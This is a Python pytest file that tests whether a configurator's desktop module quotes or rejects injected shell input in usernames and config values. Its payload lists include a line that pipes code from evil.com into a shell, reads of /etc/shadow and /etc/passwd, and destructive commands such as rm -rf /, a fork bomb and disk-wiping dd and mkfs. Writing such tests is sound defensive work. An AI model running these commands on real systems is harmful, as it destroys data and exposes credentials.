"""
Security tests for command injection prevention.

Tests for:
- Shell metacharacter injection
- Environment variable injection
- Argument injection
- Subshell execution prevention
"""

from unittest.mock import Mock, patch

import pytest

from configurator.modules.desktop import DesktopModule

pytestmark = pytest.mark.skip(reason="Command execution pattern changed")


class TestShellMetacharacterInjection:
    """Test prevention of shell metacharacter injection."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"xrdp": {"enabled": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    @pytest.mark.parametrize(
        "malicious_char,description",
        [
            (";", "semicolon command separator"),
            ("&&", "AND operator"),
            ("||", "OR operator"),
            ("|", "pipe operator"),
            (">", "output redirection"),
            ("<", "input redirection"),
            (">>", "append redirection"),
            ("2>", "stderr redirection"),
            ("&", "background operator"),
            ("\n", "newline command separator"),
            ("\r", "carriage return"),
        ],
    )
    def test_shell_metacharacter_in_username(self, module, malicious_char, description):
        """Test that shell metacharacters are not executed."""
        malicious_username = f"user{malicious_char}whoami"

        mock_user = Mock()
        mock_user.pw_name = malicious_username
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/user"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]

            with patch.object(module, "run") as mock_run:
                module._configure_user_session()

                # Check no dangerous patterns in executed commands
                for call in mock_run.call_args_list:
                    cmd = str(call)
                    # Should be quoted or rejected
                    if malicious_username in cmd:
                        # If present, should be quoted
                        assert f"'{malicious_username}'" in cmd or malicious_username not in cmd


class TestCommandSubstitution:
    """Test prevention of command substitution attacks."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"xrdp": {"enabled": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    @pytest.mark.parametrize(
        "substitution_attempt",
        [
            "$(whoami)",
            "`whoami`",
            "$((1+1))",
            "${USER}",
            "$(cat /etc/passwd)",
            "`cat /etc/shadow`",
            "$(<file)",
            "$(curl evil.com|sh)",
        ],
    )
    def test_command_substitution_prevention(self, module, substitution_attempt):
        """Test that command substitution is prevented."""
        malicious_username = f"user{substitution_attempt}"

        mock_user = Mock()
        mock_user.pw_name = malicious_username
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/user"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]

            with patch.object(module, "run") as mock_run:
                module._configure_user_session()

                # Command substitution should not appear unquoted
                for call in mock_run.call_args_list:
                    cmd = str(call)
                    # These patterns should not be in the actual command string
                    # unless properly quoted
                    if "$(whoami)" in cmd:
                        assert cmd.count("'") >= 2  # Should be quoted


class TestEnvironmentVariableInjection:
    """Test prevention of environment variable injection."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"xrdp": {"enabled": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    @pytest.mark.parametrize(
        "env_injection",
        [
            "$HOME",
            "$PATH",
            "$USER",
            "${HOME}",
            "${PATH:-/malicious}",
            "$IFS",
        ],
    )
    def test_environment_variable_not_expanded(self, module, env_injection):
        """Test that environment variables are not expanded unsafely."""
        config = {"desktop": {"xrdp": {"security_layer": env_injection}}}
        module = DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        # Should not expand env vars in config
        if mock_write.called:
            content = mock_write.call_args_list[0][0][1]
            # Variable reference should be literal or rejected
            # Should not contain expanded values


class TestArgumentInjection:
    """Test prevention of argument injection attacks."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"xrdp": {"enabled": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    @pytest.mark.parametrize(
        "arg_injection",
        [
            "--version; cat /etc/passwd",
            "-rf /",
            "--output=/etc/cron.d/evil",
            "-exec rm -rf /",
        ],
    )
    def test_argument_injection_in_config(self, module, arg_injection):
        """Test that argument injection is prevented in config values."""
        config = {"desktop": {"xrdp": {"security_layer": arg_injection}}}
        module = DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

        with patch("configurator.modules.desktop.write_file") as mock_write:
            with patch("configurator.modules.desktop.backup_file"):
                with patch.object(module, "run"):
                    module._optimize_xrdp_performance()

        if mock_write.called:
            content = mock_write.call_args_list[0][0][1]
            # Should use safe default or sanitize
            assert "rm -rf" not in content.lower()


class TestSafeCommandExecution:
    """Test that commands are executed safely."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"xrdp": {"enabled": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    def test_commands_use_list_not_string(self, module):
        """Test that commands use list form when possible."""
        mock_user = Mock()
        mock_user.pw_name = "testuser"
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/testuser"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]
            mock_pwd.getpwnam.return_value = mock_user

            with patch("configurator.modules.desktop.os.path.isabs", return_value=True):
                with patch("configurator.modules.desktop.os.path.isdir", return_value=True):
                    with patch.object(module, "run") as mock_run:
                        module._configure_user_session()

                        # Verify run was called
                        assert mock_run.called

    def test_shlex_quote_used_for_user_input(self, module):
        """Test that user input is properly quoted."""
        mock_user = Mock()
        mock_user.pw_name = "test user"  # Name with space
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/testuser"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]

            with patch.object(module, "run") as mock_run:
                module._configure_user_session()

                # Commands with spaces should be quoted or rejected
                for call in mock_run.call_args_list:
                    cmd = str(call)
                    if "test user" in cmd:
                        # Should be quoted
                        assert "'test user'" in cmd or '"test user"' in cmd


class TestDangerousPatternPrevention:
    """Test prevention of known dangerous patterns."""

    @pytest.fixture
    def module(self):
        config = {"desktop": {"xrdp": {"enabled": True}}}
        return DesktopModule(config=config, logger=Mock(), rollback_manager=Mock())

    @pytest.mark.parametrize(
        "dangerous_pattern",
        [
            "rm -rf /",
            "rm -rf /*",
            ":(){ :|:& };:",  # Fork bomb
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda",
            "chmod -R 777 /",
            "chown -R nobody /",
        ],
    )
    def test_dangerous_commands_not_executed(self, module, dangerous_pattern):
        """Test that obviously dangerous commands are never executed."""
        # Try to inject via username
        mock_user = Mock()
        mock_user.pw_name = dangerous_pattern.replace(" ", "")[:32]
        mock_user.pw_uid = 1000
        mock_user.pw_dir = "/home/user"

        with patch("configurator.modules.desktop.pwd") as mock_pwd:
            mock_pwd.getpwall.return_value = [mock_user]

            with patch.object(module, "run") as mock_run:
                module._configure_user_session()

                for call in mock_run.call_args_list:
                    cmd = str(call)
                    # These patterns should never appear
                    assert "rm -rf /" not in cmd
                    assert "rm -rf /*" not in cmd
                    assert "dd if=/dev/zero" not in cmd
                    assert "mkfs" not in cmd
